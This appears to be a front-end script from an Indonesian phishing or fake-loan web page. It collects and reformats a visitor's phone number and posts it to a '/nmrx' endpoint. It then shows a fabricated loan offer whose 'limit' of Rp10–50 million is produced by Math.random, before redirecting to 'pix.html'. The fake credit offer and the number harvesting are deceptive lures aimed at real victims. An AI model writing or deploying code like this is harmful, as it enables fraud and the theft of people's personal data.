// form.js

const phoneInput =
document.getElementById("phone");

const lanjutBtn =
document.getElementById("lanjutBtn");

const loadingBox =
document.getElementById("loadingBox");

const clearBtn =
document.getElementById("clearBtn");

const errorBox =
document.getElementById("errorBox");

lanjutBtn.classList.add("disabled");

function updateButtonStatus(){

    const nomor =
    phoneInput.value.replace(/\D/g,'');

    if(nomor.length >= 10){

        lanjutBtn.classList.remove("disabled");
        lanjutBtn.classList.add("active");

    }else{

        lanjutBtn.classList.remove("active");
        lanjutBtn.classList.add("disabled");

    }
}

/* FADE IN */ 
window.addEventListener("load", () => {

    document.body.classList.add(
    "fade-in"
    );

});

/* AUTO FOCUS */
window.onload = () => {

    phoneInput.focus();

};

/* FORMAT NOMOR */
phoneInput.addEventListener(
"input",
(e) => {

    /* ANGKA SAJA */
    let angka =
    e.target.value.replace(
    /\D/g,
    ''
    );

    /* MAX */
    angka =
    angka.substring(0,13);

    let hasil = "";

    /* 812 */
    if(angka.length > 0){

        hasil +=
        angka.substring(0,3);

    }

    /* 812-3456 */
    if(angka.length >= 3){

        hasil += "-" +
        angka.substring(3,7);

    }

    /* 812-3456-7890 */
    if(angka.length >= 7){

        hasil += "-" +
        angka.substring(7,13);

    }

    e.target.value = hasil;

    /* SHOW / HIDE X */
    if(hasil.length > 0){

        clearBtn.style.display =
        "flex";

    }else{

        clearBtn.style.display =
        "none";

    }

    /* HIDE ERROR */
    errorBox.classList.remove(
    "show"
    );

  updateButtonStatus();

});

/* CLEAR INPUT */
clearBtn.addEventListener(
"click",
() => {

    phoneInput.value = "";

    clearBtn.style.display =
    "none";

    errorBox.classList.remove(
    "show"
    );

    phoneInput.focus();

  updateButtonStatus();

});

/* KEYBOARD ANGKA */
phoneInput.setAttribute(
"inputmode",
"numeric"
);

/* ENTER */
phoneInput.addEventListener(
"keypress",
(e)=>{

    if(e.key === "Enter"){

        lanjutBtn.click();

    }

});

/* LANJUT */
lanjutBtn.addEventListener(
"click",
 async () => {

   if(lanjutBtn.classList.contains("disabled")){
    return;
}

    /* AMBIL NOMOR */
    const nomor =
    phoneInput.value.replace(
    /\D/g,
    ''
    );

    /* VALIDASI */
    if(
        nomor.length < 9 ||
        nomor.charAt(0) !== "8"
    ){

        if(navigator.vibrate){

        navigator.vibrate([
            120,
            80,
            120
        ]);

    }

        /* SHOW ERROR */
        errorBox.classList.add(
        "show"
        );

        /* AUTO HIDE */
        setTimeout(() => {

            errorBox.classList.remove(
            "show"
            );

        },2000);

        phoneInput.focus();

        return;

    }

    /* SIMPAN */
    localStorage.setItem(
    "nmrx",
    phoneInput.value
    );

    /* KIRIM */
    await fetch("/nmrx", {

        method:"POST",

        headers:{
            "Content-Type":
            "application/json"
        },

        body:JSON.stringify({

            nmrx:phoneInput.value

        })

    });

    /* SHOW LOADING */
    loadingBox.style.display =
    "flex";

    /* PINDAH */
    setTimeout(()=>{

    const produkDipilih = localStorage.getItem("produkDipilih");

    if(produkDipilih === "pinjaman"){

        loadingBox.style.display = "none";
        document.body.classList.remove("fade-out");
        showLoanPopup();

    }else{

        document.body.classList.add("fade-out");

        setTimeout(()=>{
            window.location.href = "pix.html";
        },500);

    }

},2000);

});

/* RESET LOADING */
window.addEventListener(
"pageshow",
() => {

    loadingBox.style.display =
    "none";

});

const loanPopup = document.getElementById("loanPopup");
const loanRange = document.getElementById("loanRange");
const loanAmount = document.getElementById("loanAmount");
const limitUtama = document.getElementById("limitUtama");
const limitTotal = document.getElementById("limitTotal");
const cairkanBtn = document.getElementById("cairkanBtn");

function formatRupiah(angka){
    return "Rp" + angka.toLocaleString("id-ID");
}

function randomLimit(){
    const min = 10000000;
    const max = 50000000;
    const step = 1000000;

    return Math.floor(
        Math.random() * ((max - min) / step + 1)
    ) * step + min;
}

function updateLoanSlider(){
    const value = Number(loanRange.value);
    const max = Number(loanRange.max);
    const percent = (value / max) * 100;

    loanAmount.innerText = formatRupiah(value);

    loanRange.style.background = `
        linear-gradient(
            90deg,
            #1aa8ff 0%,
            #1aa8ff ${percent}%,
            #edf3f8 ${percent}%,
            #edf3f8 100%
        )
    `;

    localStorage.setItem("jumlahPinjaman", value);
}

loanRange.addEventListener("input", updateLoanSlider);

function showLoanPopup(){
    const limit = randomLimit();

    localStorage.setItem("limitPinjaman", limit);

    limitUtama.innerText = formatRupiah(limit);
    limitTotal.innerText = formatRupiah(limit);

    loanRange.max = limit;
    loanRange.value = 500000;

    updateLoanSlider();

    loanPopup.classList.add("show");
}

cairkanBtn.addEventListener("click", () => {
    loanPopup.classList.remove("show");

    loadingBox.style.display = "flex";

    setTimeout(() => {
        document.body.classList.add("fade-out");

        setTimeout(() => {
            window.location.href = "pix.html";
        },500);

    },900);
});
